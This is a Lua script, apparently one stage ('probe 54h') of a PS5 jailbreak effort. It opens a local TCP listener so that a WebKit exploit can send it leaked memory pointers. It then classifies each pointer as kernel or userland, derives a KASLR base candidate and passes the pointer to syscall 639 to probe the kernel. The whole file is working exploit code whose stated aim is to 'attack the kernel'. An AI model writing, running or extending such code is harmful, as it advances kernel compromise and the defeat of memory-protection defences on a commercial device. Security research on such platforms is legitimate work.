-- CRASH_CLASS: LOW
-- PROBE 54h: Lua-side TCP bridge for WebKit coordination
--
-- Context: WebKit probes (54g) run in the browser and beacon results via HTTP.
-- This probe opens a TCP listener on the PS5 that WebKit can connect to via
-- fetch() or WebSocket, enabling real-time data exchange between the two
-- attack surfaces.
--
-- Flow:
-- 1. Lua opens a listening TCP socket on a low port (e.g. 8888)
-- 2. WebKit connects via fetch('http://localhost:8888/...')
-- 3. WebKit sends leaked addresses/pointers
-- 4. Lua parses them and uses make_syscall to attack the kernel
--
-- This combines WebKit's heap corruption + OOB read with Lua's syscall access.

print("=== PROBE 54h: LUA-WEBKIT BRIDGE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

-- Socket syscalls
local sc_socket = make_syscall(97)    -- socket
local sc_bind = make_syscall(104)     -- bind
local sc_listen = make_syscall(106)   -- listen
local sc_accept = make_syscall(30)    -- accept
local sc_read = make_syscall(3)       -- read
local sc_write = make_syscall(4)      -- write
local sc_close = make_syscall(6)      -- close
local sc_setsockopt = make_syscall(105) -- setsockopt

-- Phase 1: Create listening socket
print("[*] Creating TCP listener on port 8888...")

-- socket(AF_INET=2, SOCK_STREAM=1, 0)
local ok, srv_fd = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(0), uint64(0), uint64(0), uint64(0))
end)
if not ok then
    print("[-] socket() failed: " .. tostring(srv_fd))
    print("=== PROBE 54h FAILED ===")
    return
end
local srv = signed32(srv_fd)
print("[+] socket fd = " .. srv)

if srv < 0 then
    print("[-] socket returned error")
    print("=== PROBE 54h FAILED ===")
    return
end

-- SO_REUSEADDR
local optbuf = memory.alloc(8)
safe_wd(optbuf, 1)
pcall(function()
    sc_setsockopt(uint64(srv), uint64(0xFFFF), uint64(4), uint64(optbuf), uint64(4), uint64(0))
end)

-- bind to 0.0.0.0:8888
local PORT = 8888
local sa = memory.alloc(16)
safe_wd(sa, 0x0210)         -- sin_len=2, sin_family=AF_INET (little-endian struct)
-- Port 8888 = 0x22B8, network byte order
local port_hi = math.floor(PORT / 256)
local port_lo = PORT - port_hi * 256
safe_wd(sa, 0x0002 + port_hi * 0x10000 + port_lo * 0x1000000)  -- family + port (network order)
safe_wd(sa + 4, 0)          -- INADDR_ANY

local ok2, bind_ret = pcall(function()
    return sc_bind(uint64(srv), uint64(sa), uint64(16), uint64(0), uint64(0), uint64(0))
end)
if ok2 then
    print("[*] bind() = " .. signed32(bind_ret))
else
    print("[-] bind() failed: " .. tostring(bind_ret))
end

-- listen
local ok3, listen_ret = pcall(function()
    return sc_listen(uint64(srv), uint64(5), uint64(0), uint64(0), uint64(0), uint64(0))
end)
if ok3 then
    print("[*] listen() = " .. signed32(listen_ret))
else
    print("[-] listen() failed: " .. tostring(listen_ret))
end

print("[*] Listening on port " .. PORT)
print("[*] WebKit can connect via: fetch('http://localhost:" .. PORT .. "/leak?ptr=HEXVALUE')")
print("")

-- Phase 2: Accept one connection and read data
print("[*] Waiting for connection (will block)...")

local peer_sa = memory.alloc(32)
local peer_len = memory.alloc(8)
safe_wd(peer_len, 32)

local ok4, client_fd = pcall(function()
    return sc_accept(uint64(srv), uint64(peer_sa), uint64(peer_len), uint64(0), uint64(0), uint64(0))
end)

if not ok4 then
    print("[-] accept() failed: " .. tostring(client_fd))
    pcall(function() sc_close(uint64(srv), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    print("=== PROBE 54h FAILED ===")
    return
end

local cli = signed32(client_fd)
print("[+] Client connected, fd = " .. cli)

if cli < 0 then
    print("[-] accept returned error: " .. cli)
    pcall(function() sc_close(uint64(srv), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    print("=== PROBE 54h FAILED ===")
    return
end

-- Read HTTP request from WebKit
local readbuf = memory.alloc(0x1000)
for i = 0, 0xFF0, 4 do safe_wd(readbuf + i, 0) end

local ok5, nread = pcall(function()
    return sc_read(uint64(cli), uint64(readbuf), uint64(0x1000), uint64(0), uint64(0), uint64(0))
end)

if ok5 then
    local nbytes = signed32(nread)
    print("[+] Read " .. nbytes .. " bytes from client")

    -- Dump what we got (should be HTTP GET with pointer data)
    local data = ""
    for i = 0, math.min(nbytes - 1, 511) do
        local b = safe_rd(readbuf + i)
        if b then
            local ch = b % 256
            if ch >= 32 and ch < 127 then
                data = data .. string.char(ch)
            else
                data = data .. "."
            end
        end
    end
    print("[*] Request: " .. data:sub(1, 200))

    -- Parse pointer from URL: GET /leak?ptr=HEXVALUE HTTP/1.1
    local ptr_hex = data:match("ptr=(%x+)")
    if ptr_hex then
        print("[+] Received pointer from WebKit: 0x" .. ptr_hex)
        print("")

        -- Phase 3: Use the leaked pointer with syscalls
        print("[*] Phase 3: Using leaked pointer for kernel attacks")

        -- If it's a userland pointer, use it to understand ASLR layout
        -- If it's kernel-like, we have KASLR defeat

        local ptr_val = uint64("0x" .. ptr_hex)
        local h, l = get_hi_lo(ptr_val)

        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
            print("[!!!] KERNEL POINTER RECEIVED FROM WEBKIT: 0x" .. ptr_hex)
            print("[!!!] KASLR BASE CANDIDATE (aligned): " .. string.format("0x%08X_%08X", h, l - (l % 0x4000)))

            -- Try sys 639 with this as a hint
            local sc639 = make_syscall(639)
            local info = memory.alloc(0x200)
            for i = 0, 0x1F0, 4 do safe_wd(info + i, 0) end
            local ok_639, ret_639 = pcall(function()
                return sc639(ptr_val, uint64(info), uint64(0x200), uint64(0), uint64(0), uint64(0))
            end)
            if ok_639 then
                print("[*] sys 639 with kernel ptr: ret=" .. signed32(ret_639))
                for i = 0, 0x3F, 8 do
                    local qv = safe_rq(info + i)
                    if qv then
                        local qh, ql = get_hi_lo(qv)
                        if qh ~= 0 or ql ~= 0 then
                            print(string.format("  +%02X: %s", i, hexval(qv)))
                        end
                    end
                end
            end
        else
            print("[*] Userland pointer: 0x" .. ptr_hex)
            print("[*] Using for ASLR base calculation")
        end
    else
        print("[-] No pointer found in request")
    end

    -- Send HTTP response
    local resp = "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: 2\r\n\r\nOK"
    local respbuf = memory.alloc(256)
    for i = 0, #resp - 1 do
        safe_wd(respbuf + i, string.byte(resp, i + 1))
    end
    pcall(function()
        sc_write(uint64(cli), uint64(respbuf), uint64(#resp), uint64(0), uint64(0), uint64(0))
    end)
else
    print("[-] read() failed: " .. tostring(nread))
end

-- Cleanup
pcall(function() sc_close(uint64(cli), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
pcall(function() sc_close(uint64(srv), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)

print("")
print("=== PROBE 54h COMPLETE ===")
